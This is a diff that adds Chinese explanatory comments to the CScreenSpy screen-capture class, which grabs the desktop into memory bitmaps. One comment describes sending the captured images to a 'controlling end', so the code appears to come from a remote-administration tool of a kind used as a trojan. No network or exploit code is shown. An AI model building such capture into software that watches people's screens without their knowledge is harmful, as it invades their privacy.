@@ -33,13 +33,17 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	
 	if (!SelectInputWinStation())
 	{
+		// 得到桌面窗口
 		m_hDeskTopWnd = GetDesktopWindow();
+
+		// 根据窗口获取DC举兵
 		m_hFullDC = GetDC(m_hDeskTopWnd);
 	}
 
 	m_dwBitBltRop	= SRCCOPY;
 
-	m_bAlgorithm	= ALGORITHM_SCAN; // 默认使用隔行扫描算法
+	// 默认使用隔行扫描算法
+	m_bAlgorithm	= ALGORITHM_SCAN; 
 	m_dwLastCapture	= GetTickCount();
 	m_nMaxFrameRate	= nMaxFrameRate;
 	m_dwSleep		= 1000 / nMaxFrameRate;
@@ -50,6 +54,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 
 	m_nStartLine	= 0;
 
+	// 根据设备创建DC
 	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);
 	m_hDiffMemDC	= ::CreateCompatibleDC(m_hFullDC);
 	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
@@ -57,21 +62,27 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	m_lpvLineBits	= NULL;
 	m_lpvFullBits	= NULL;
 
+	// LPBITMAPINFO位图信息结构
 	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
 	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
 	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
 
+	// 创建位图结构保存在m_lpbmi_full、m_lpvFullBits类型的缓冲区中
+	// 这样做是将抓取到的图像不用保存到文件来发送到主控端
+	// 我们直接为位图分配了保存数据的内存空间
 	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
 	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
 	m_hDiffBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvDiffBits, NULL, NULL);
 
+	// 将内存DC和HITMAP联系起来
+	// 通过m_hFullMemDC抓取数据保存在 m_hFullBitmap然后数据保存到缓冲区m_lpvFullBits中
 	::SelectObject(m_hFullMemDC, m_hFullBitmap);
 	::SelectObject(m_hLineMemDC, m_hLineBitmap);
 	::SelectObject(m_hDiffMemDC, m_hDiffBitmap);
 	
 	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);
 
-	// 足够了
+	// 足够了 分配临时抓取数据图形的缓冲区
 	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
 	m_nDataSizePerLine = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;
 
@@ -200,6 +211,8 @@ void CScreenSpy::setAlgorithm(UINT nAlgorithm)
 	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
 }
 
+
+// 创建位图结构
 LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
 {
 /*
@@ -303,13 +316,16 @@ void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
 
 LPBITMAPINFO CScreenSpy::getBI()
 {
+	// LPBITMAPINFO位图信息结构
 	return m_lpbmi_full;
 }
 
 UINT CScreenSpy::getBISize()
 {
+	// 当前位图大小
 	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
 	
+	// 结构+位图X结构大小 
 	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
 }
 
